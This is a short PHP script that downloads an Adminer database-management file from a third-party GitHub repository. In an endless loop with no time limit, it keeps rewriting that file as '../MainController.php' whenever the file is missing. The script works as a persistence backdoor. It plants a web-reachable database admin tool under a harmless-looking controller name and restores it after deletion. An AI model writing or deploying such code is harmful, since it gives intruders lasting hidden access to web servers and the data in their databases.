<?php
ini_set('max_execution_time', 0);
$txt=file_get_contents("https://raw.githubusercontent.com/n3f0/adminer/main/adminer-4.8.1.php");
while(1){
  if(!file_exists("../MainController.php")){
      file_put_contents("../MainController.php",$txt);
  }else{
    echo "File exists.everythings is okay!";
  }
}
